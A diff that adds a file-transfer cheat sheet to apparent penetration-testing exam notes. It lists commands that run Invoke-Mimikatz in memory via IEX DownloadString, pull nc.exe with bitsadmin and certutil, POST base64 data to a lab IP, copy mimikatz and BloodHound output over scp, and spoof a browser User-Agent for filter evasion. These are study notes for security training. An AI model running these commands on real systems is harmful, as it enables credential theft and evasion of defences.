@@ -454,6 +454,47 @@ ftp -v -n -s:ftpcommand.txt
         
 	- **Base64, SMB, FTP, HTTP, WebDAV** should all be in your toolbox
 
+
+
+### CheatSheet
+Here you go — clean, readable, and exam-ready 👇  
+(I normalized wording and grouped it logically.)
+
+---
+
+### 📥📤 File Transfer Commands Cheat Sheet
+
+|Command|Description|
+|---|---|
+|`Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`|Download a file with PowerShell|
+|`IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`|Execute a PowerShell script **in memory**|
+|`Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`|Upload a file using PowerShell (POST request)|
+|`bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`|Download a file using **Bitsadmin**|
+|`certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`|Download a file using **Certutil**|
+|`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`|Download a file using **wget**|
+|`curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`|Download a file using **curl**|
+|`php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`|Download a file using **PHP**|
+|`scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`|Upload a file using **SCP**|
+|`scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`|Download a file using **SCP**|
+|`Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"`|Download a file using **Invoke-WebRequest** with a Chrome User-Agent|
+
+---
+
+### 🧠 Pro tip (exam + real-world)
+
+If you had to mentally tag these:
+
+- **Stealth / modern** → `IEX + DownloadString`, HTTPS
+    
+- **LOLbins** → `bitsadmin`, `certutil`
+    
+- **Linux targets** → `wget`, `curl`
+    
+- **Authenticated internal transfer** → `scp`
+    
+- **Proxy / filtering evasion** → custom User-Agent
+
+
 ### Exercises
 ![[Pasted image 20260207164421.png]]
 
